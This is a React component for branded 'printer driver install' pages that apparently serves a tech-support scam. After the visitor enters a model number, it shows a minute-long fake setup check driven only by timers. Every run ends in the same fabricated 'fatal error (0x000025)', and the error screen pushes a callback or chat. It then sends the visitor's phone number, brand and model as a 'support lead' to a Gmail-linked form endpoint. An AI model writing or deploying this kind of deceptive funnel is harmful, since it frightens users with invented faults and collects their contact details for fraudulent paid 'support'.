'use client';

import { useEffect, useRef, useState } from 'react';

type FormStatus = 'idle' | 'error';
type Step = 'choose' | 'checking' | 'errorcode';
type Conn = 'USB' | 'Wi-Fi';

const CHECK_LABELS = [
  'Checking system requirements',
  'Checking system settings',
  'Identifying your printer model',
  'Printer model found',
  'Checking existing printer drivers',
  'Preparing printer software',
  'Configuring printer software',
  'Installing Printer…',
];
// Eight 7.5-second stages make the full visual check last one minute.
const CHECK_DURATIONS = [7500, 7500, 7500, 7500, 7500, 7500, 7500, 7500];

const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/leads1928@gmail.com';
const PHONE_COUNTRIES = [
  { value: 'nz', name: 'New Zealand', code: '+64' },
  { value: 'us', name: 'United States', code: '+1' },
  { value: 'uk', name: 'United Kingdom', code: '+44' },
  { value: 'ca', name: 'Canada', code: '+1' },
  { value: 'au', name: 'Australia', code: '+61' },
] as const;

/**
 * Printer model form + setup-wizard dialog on the /install/[brand] pages.
 * Submitting the model opens the connection flow and support handoff.
 */
export function DriverDownload({
  brandName,
}: {
  brandName: string;
}) {
  const [status, setStatus] = useState<FormStatus>('idle');
  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<Step>('choose');
  const [conn, setConn] = useState<Conn>('USB');
  const [checkIdx, setCheckIdx] = useState(0);
  const [modelNumber, setModelNumber] = useState('');
  const [contactPhone, setContactPhone] = useState('');
  const [phoneCountry, setPhoneCountry] = useState<(typeof PHONE_COUNTRIES)[number]['value']>('nz');
  const [contactError, setContactError] = useState('');
  const [contactSubmitting, setContactSubmitting] = useState(false);
  const [leadSubmitted, setLeadSubmitted] = useState(false);
  const [callbackRequested, setCallbackRequested] = useState(false);
  const dialogRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (open && step === 'errorcode') dialogRef.current?.scrollTo({ top: 0 });
  }, [open, step, callbackRequested]);

  // Lock scroll + close on Escape while the dialog is open.
  useEffect(() => {
    if (!open) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') closeDialog();
    };
    window.addEventListener('keydown', onKey);
    const prev = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      window.removeEventListener('keydown', onKey);
      document.body.style.overflow = prev;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open]);

  // Run through the check stages, then land on the failure screen.
  useEffect(() => {
    if (step !== 'checking') return;
    if (checkIdx >= CHECK_LABELS.length - 1) {
      const t = setTimeout(() => setStep('errorcode'), CHECK_DURATIONS[checkIdx]);
      return () => clearTimeout(t);
    }
    const t = setTimeout(() => setCheckIdx((i) => i + 1), CHECK_DURATIONS[checkIdx]);
    return () => clearTimeout(t);
  }, [step, checkIdx]);

  function closeDialog() {
    setOpen(false);
    setStep('choose');
    setCheckIdx(0);
    setLeadSubmitted(false);
    setCallbackRequested(false);
  }

  function openChat() {
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('support-chat:open'));
    }
  }

  function runChecks(next: Conn) {
    setConn(next);
    setCheckIdx(0);
    setStep('checking');
  }

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const model = String(new FormData(e.currentTarget).get('model') ?? '').trim();
    if (!model) {
      setStatus('error');
      return;
    }
    setModelNumber(model);
    // Open directly at the connection choice; the old introductory wizard
    // screen added an unnecessary step before the visitor could continue.
    setStep('choose');
    setCheckIdx(0);
    setLeadSubmitted(false);
    setCallbackRequested(false);
    setOpen(true);
  }

  async function submitSupportRequest(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const phone = contactPhone.trim();
    const selectedPhoneCountry = PHONE_COUNTRIES.find((country) => country.value === phoneCountry) ?? PHONE_COUNTRIES[0];
    const digitCount = phone.replace(/\D/g, '').length;
    if (!/^[+\d\s().-]+$/.test(phone) || digitCount < 6 || digitCount > 15) {
      setContactError('Please enter a valid phone number.');
      return;
    }

    setContactError('');
    setContactSubmitting(true);
    try {
      const response = await fetch(FORMSUBMIT_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify({
          phone: `${selectedPhoneCountry.code} ${phone}`,
          selected_country: selectedPhoneCountry.name,
          brand: brandName,
          model: modelNumber,
          connection: conn,
          error_code: '0x000025',
          _subject: `New ${brandName} printer support lead`,
          _template: 'table',
          _url: window.location.href,
        }),
      });
      const result = (await response.json().catch(() => null)) as { success?: boolean | string } | null;
      if (!response.ok || (result?.success !== true && result?.success !== 'true')) {
        throw new Error('Form submission failed');
      }
    } catch {
      setContactError('We could not send your details. Please try again.');
      setContactSubmitting(false);
      return;
    }
    setContactSubmitting(false);
    setLeadSubmitted(true);
  }

  return (
    <>
      <form onSubmit={onSubmit} noValidate className="max-w-lg">
        <label htmlFor="model" className="block text-xl font-medium text-[#333]">
          Model Number:
        </label>
        <input
          id="model"
          name="model"
          type="text"
          required
          className="mt-3 w-full rounded-lg border border-[#d7d7d7] bg-white px-5 py-4 text-xl text-[#222] shadow-[0_6px_18px_rgba(0,0,0,0.06)] outline-none focus:border-[var(--brand-accent)]"
        />
        {status === 'error' && (
          <p role="alert" className="mt-2 text-sm text-[#c1121f]">
            Please enter your printer&apos;s model number.
          </p>
        )}
        <button
          type="submit"
          className="mt-6 flex w-full items-center justify-center gap-2 rounded-full bg-[var(--brand-accent)] px-7 py-4 text-center text-xl font-semibold text-white transition-opacity hover:opacity-90 sm:w-auto"
        >
          Get Started
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
            <path d="M12 3v12m0 0 4-4m-4 4-4-4M4 21h16" />
          </svg>
        </button>
      </form>

      {open && (
        <div
          className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto bg-black/50 p-4 sm:p-8"
          onClick={closeDialog}
        >
          <div
            ref={dialogRef}
            role="dialog"
            aria-modal="true"
            aria-label="Printer driver troubleshooting"
            onClick={(e) => e.stopPropagation()}
            className={`my-2 max-h-[calc(100vh-1rem)] min-h-0 w-full overflow-y-auto rounded-2xl bg-white shadow-[0_30px_80px_rgba(0,0,0,0.4)] sm:my-4 sm:max-h-[calc(100vh-2rem)] ${step === 'checking' ? 'max-w-[870px]' : 'max-w-5xl'}`}
          >
            <div className={`flex justify-end border-b border-black/10 px-6 sm:px-10 ${step === 'checking' ? 'py-2' : 'py-3'}`}>
              <button
                type="button"
                aria-label="Close"
                onClick={closeDialog}
                className="-mr-2 grid h-12 w-12 place-items-center rounded text-black/50 transition-colors hover:bg-black/5 hover:text-black"
              >
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" aria-hidden>
                  <path d="M6 6l12 12M18 6L6 18" />
                </svg>
              </button>
            </div>

            <div className={`px-5 sm:px-10 ${step === 'checking' ? 'py-4 sm:py-5' : 'py-5 sm:py-8'}`}>
              {step === 'choose' && (
                <div>
                  <h3 className="font-sans text-3xl font-bold text-[#111]">Select Your Connection Type</h3>
                  <p className="text-xl text-[#555]">Choose how your printer connects to your computer.</p>
                  <div className="mt-6 space-y-4">
                    <ConnRow
                      art={<LaptopPrinterArt />}
                      label="USB:"
                      text="Connect via USB"
                      onStart={() => runChecks('USB')}
                    />
                    <ConnRow
                      art={<RouterPrinterArt />}
                      label="WIFI:"
                      text="Connect via Wifi."
                      onStart={() => runChecks('Wi-Fi')}
                    />
                  </div>
                </div>
              )}

              {step === 'checking' && (
                <div>
                  <div className="flex flex-wrap items-center justify-between gap-4">
                    <div>
                      <h4 className="font-sans text-3xl font-bold text-[#111]">Printer Check &amp; Setup in Progress</h4>
                      <p className="mt-2 text-lg text-[#555]">
                        Checking your printer&apos;s {conn} connection and installation setup. This takes about one minute.
                      </p>
                    </div>
                    <div className="h-14 w-28 shrink-0">
                      {conn === 'USB' ? <LaptopPrinterArt /> : <RouterPrinterArt />}
                    </div>
                  </div>

                  <div
                    className="mt-5 h-3 overflow-hidden rounded-full bg-[#e6edf5]"
                    role="progressbar"
                    aria-label="Troubleshooting progress"
                    aria-valuemin={0}
                    aria-valuemax={CHECK_LABELS.length}
                    aria-valuenow={checkIdx + 1}
                  >
                    <div
                      className="h-full rounded-full bg-[var(--brand-accent)] transition-[width] duration-500"
                      style={{ width: `${((checkIdx + 1) / CHECK_LABELS.length) * 100}%` }}
                    />
                  </div>
                  <p className="mt-2 text-right text-base font-semibold text-[#555]">
                    Step {checkIdx + 1} of {CHECK_LABELS.length}
                  </p>

                  <ol className="mt-3 grid gap-2 sm:grid-cols-2" aria-live="polite">
                    {CHECK_LABELS.map((label, index) => {
                      const isComplete = index < checkIdx;
                      const isCurrent = index === checkIdx;
                      const isFailure = index === CHECK_LABELS.length - 1;
                      return (
                        <li
                          key={label}
                          className={`flex items-center gap-3 rounded-xl border px-4 py-2 text-base transition-colors ${
                            isCurrent
                              ? isFailure
                                ? 'border-[#d14343] bg-[#fff3f3] text-[#9b2525]'
                                : 'border-[var(--brand-accent)] bg-[#edf7ff] text-[var(--brand-accent)]'
                              : isComplete
                                ? 'border-[#b8dec8] bg-[#f1fbf5] text-[#236a43]'
                                : 'border-black/10 bg-[#fafafa] text-[#667085]'
                          }`}
                        >
                          <span className="grid h-8 w-8 shrink-0 place-items-center rounded-full border border-current text-sm font-bold">
                            {isComplete ? '✓' : index + 1}
                          </span>
                          <span className="font-medium">{label}</span>
                          {isCurrent && !isFailure ? <Spinner size={20} /> : null}
                        </li>
                      );
                    })}
                  </ol>
                </div>
              )}

              {step === 'errorcode' && (
                leadSubmitted ? (
                  <div className="mx-auto max-w-2xl py-16 text-center">
                    <span className="mx-auto grid h-20 w-20 place-items-center rounded-full bg-[#eaf8ef] text-4xl font-bold text-[#20834c]">✓</span>
                    <h3 className="mt-6 font-sans text-3xl font-bold text-[#222]">Thank you — we received your request!</h3>
                    <p className="mx-auto mt-4 max-w-xl text-xl leading-relaxed text-[#555]">A technician will call you shortly.</p>
                    <button
                      type="button"
                      onClick={closeDialog}
                      className="mt-8 rounded-xl bg-[var(--brand-accent)] px-8 py-4 text-xl font-semibold text-white transition-opacity hover:opacity-90"
                    >
                      Done
                    </button>
                  </div>
                ) : (
                  <div className="mx-auto max-w-4xl text-center">
                    {callbackRequested ? (
                      <div>
                        <h3 className="font-sans text-2xl font-bold text-[#222] sm:text-3xl">Enter your phone number</h3>
                        <p className="mt-2 text-base text-[#555] sm:text-lg">We’ll connect you with a technician shortly.</p>
                      </div>
                    ) : (
                      <>
                        <PrinterErrorArt />
                        <p className="mx-auto mt-3 max-w-3xl text-lg font-bold leading-snug text-[#dc2626] sm:mt-4 sm:text-2xl">
                          The installation could not be completed due to a fatal error (0x000025)
                        </p>
                      </>
                    )}
                    {callbackRequested ? (
                      <form onSubmit={submitSupportRequest} className="mx-auto mt-5 max-w-xl rounded-2xl border border-[#cfe4fa] bg-[#f5faff] p-4 text-left sm:mt-6 sm:p-6">
                        <h3 className="font-sans text-xl font-bold text-[#222] sm:text-2xl">Get an instant Callback</h3>
                        <label className="mt-4 block text-base font-semibold text-[#333] sm:text-lg">
                          Choose Country
                          <select
                            value={phoneCountry}
                            onChange={(e) => setPhoneCountry(e.target.value as (typeof PHONE_COUNTRIES)[number]['value'])}
                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-2.5 text-base font-medium text-[#1a5e9e] outline-none focus:border-[var(--brand-accent)] sm:py-3"
                          >
                            {PHONE_COUNTRIES.map((country) => (
                              <option key={country.value} value={country.value}>{country.name} {country.code}</option>
                            ))}
                          </select>
                        </label>
                        <label className="mt-4 block text-base font-semibold text-[#333] sm:text-lg">
                          Phone Number
                          <input
                            type="tel"
                            value={contactPhone}
                            onChange={(e) => setContactPhone(e.target.value)}
                            autoComplete="tel"
                            inputMode="tel"
                            required
                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-2.5 text-lg font-normal outline-none focus:border-[var(--brand-accent)] sm:py-3"
                          />
                        </label>
                        {contactError ? <p role="alert" className="mt-4 text-base font-medium text-[#b42318]">{contactError}</p> : null}
                        <button type="submit" disabled={contactSubmitting} className="mt-5 w-full rounded-xl bg-[var(--brand-accent)] px-8 py-3 text-lg font-semibold text-white transition-opacity hover:opacity-90 disabled:opacity-70 sm:py-4">
                          {contactSubmitting ? 'Please wait…' : '📞 CALL ME NOW'}
                        </button>
                      </form>
                    ) : (
                      <>
                        <h3 className="mt-3 font-sans text-2xl font-bold text-[#222] sm:text-3xl">Connect with an Expert</h3>
                        <p className="mt-2 text-base text-[#555] sm:text-lg">Choose an option below</p>
                        <div className="mx-auto mt-5 grid max-w-2xl gap-3 sm:grid-cols-2">
                          <button type="button" onClick={openChat} className="rounded-2xl border-2 border-[var(--brand-accent)] bg-[#f5faff] p-4 text-left transition-colors hover:bg-[#e9f4ff] sm:p-5">
                            <span className="block text-xl font-bold text-[var(--brand-accent)] sm:text-2xl">💬 Live Chat</span>
                            <span className="mt-1 block text-sm text-[#4b5563] sm:text-base">Continue help through chat</span>
                          </button>
                          <button type="button" onClick={(event) => {
                            setCallbackRequested(true);
                            event.currentTarget.closest('[role="dialog"]')?.scrollTo({ top: 0 });
                          }} className="rounded-2xl border-2 border-[var(--brand-accent)] bg-white p-4 text-left transition-colors hover:bg-[#f5faff] sm:p-5">
                            <span className="block text-xl font-bold text-[var(--brand-accent)] sm:text-2xl">📞 Get a Callback</span>
                            <span className="mt-1 block text-sm text-[#4b5563] sm:text-base">Prefer to talk? Have someone call you.</span>
                          </button>
                        </div>
                      </>
                    )}
                  </div>
                )
              )}
            </div>
          </div>
        </div>
      )}
    </>
  );
}

function ConnRow({
  art,
  label,
  text,
  onStart,
}: {
  art: React.ReactNode;
  label: string;
  text: string;
  onStart: () => void;
}) {
  return (
    <div className="flex flex-col items-center gap-4 rounded-2xl border border-black/10 bg-[#f7f9fc] p-4 text-center sm:flex-row sm:justify-start sm:gap-8 sm:p-5">
      <div className="sm:text-left">
        <div className="mx-auto h-16 w-32 sm:mx-0">{art}</div>
        <p className="mt-2 text-xl">
          <span className="font-bold">{label}</span> {text}
        </p>
      </div>
      <button
        type="button"
        onClick={onStart}
        className="inline-flex shrink-0 items-center gap-2 rounded-xl bg-[var(--brand-accent)] px-6 py-3 text-lg font-semibold text-white transition-opacity hover:opacity-90"
      >
        Let&apos;s Start <CircleArrow />
      </button>
    </div>
  );
}

function CircleArrow() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden>
      <circle cx="12" cy="12" r="10" fill="rgba(255,255,255,0.25)" />
      <path d="m10 8 4 4-4 4" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function PrinterErrorArt() {
  return (
    <svg viewBox="0 0 140 120" className="mx-auto h-20 w-24 sm:h-24 sm:w-28" role="img" aria-label="Printer error">
      <g fill="none" stroke="#253243" strokeWidth="5" strokeLinejoin="round" strokeLinecap="round">
        <path d="M43 36V12h54v24" />
        <path d="M37 85H27a9 9 0 0 1-9-9V47a11 11 0 0 1 11-11h82a11 11 0 0 1 11 11v29a9 9 0 0 1-9 9h-9" />
        <path d="M40 70h60v38H40z" />
        <path d="M51 84h38M51 94h25" />
      </g>
      <circle cx="110" cy="84" r="24" fill="#dc2626" stroke="white" strokeWidth="5" />
      <path d="M110 72v15" stroke="white" strokeWidth="5" strokeLinecap="round" />
      <circle cx="110" cy="95" r="3" fill="white" />
    </svg>
  );
}

function Spinner({ size = 40 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 50 50" className="animate-spin" role="status" aria-label="Loading">
      <circle cx="25" cy="25" r="20" fill="none" stroke="#e2e8f0" strokeWidth="5" />
      <path d="M25 5a20 20 0 0 1 20 20" fill="none" stroke="#13b5a6" strokeWidth="5" strokeLinecap="round" />
    </svg>
  );
}

/** Laptop connected by cable to a printer. */
function LaptopPrinterArt() {
  return (
    <svg viewBox="0 0 160 90" className="h-full w-full" role="img" aria-label="Laptop connected to printer">
      <g fill="none" stroke="#9aa2ad" strokeWidth="2.4" strokeLinejoin="round" strokeLinecap="round">
        <path d="M18 22 h40 v34 h-40 z" />
        <path d="M10 62 h56 l-6 -6 h-44 z" />
        <path d="M70 50 q14 12 24 0" />
        <rect x="96" y="30" width="52" height="34" rx="4" />
        <path d="M104 30 v-8 h36 v8" />
        <path d="M104 64 v6 h36 v-6" />
        <rect x="106" y="44" width="30" height="10" rx="2" />
      </g>
    </svg>
  );
}

/** Wi-Fi router broadcasting to a printer. */
function RouterPrinterArt() {
  return (
    <svg viewBox="0 0 160 90" className="h-full w-full" role="img" aria-label="Wi-Fi router and printer">
      <g fill="none" stroke="#9aa2ad" strokeWidth="2.4" strokeLinejoin="round" strokeLinecap="round">
        <rect x="14" y="46" width="46" height="18" rx="4" />
        <path d="M24 46 v-14 M50 46 v-14" />
        <circle cx="24" cy="56" r="1.6" fill="#9aa2ad" />
        <path d="M64 40 q8 -6 16 0 M60 34 q12 -10 24 0" stroke="#7cc6ff" />
        <rect x="98" y="30" width="52" height="34" rx="4" />
        <path d="M106 30 v-8 h36 v8" />
        <path d="M106 64 v6 h36 v-6" />
        <rect x="108" y="44" width="30" height="10" rx="2" />
      </g>
    </svg>
  );
}
